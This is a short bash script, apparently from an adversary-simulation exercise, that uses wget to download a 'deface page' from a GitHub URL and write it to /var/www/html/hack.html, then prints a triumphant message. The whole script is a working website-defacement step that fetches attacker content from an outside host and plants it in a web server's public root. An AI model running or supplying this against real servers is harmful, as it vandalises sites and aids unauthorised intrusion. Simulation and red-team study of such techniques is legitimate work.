#!/bin/bash

execute() {
    echo "Downloading deface page"
    wget -O /var/www/html/hack.html https://github.com/fareedfauzi/Adv_Sim/blob/main/hack.html
    echo "Success! Follow the order!!!"
}
execute
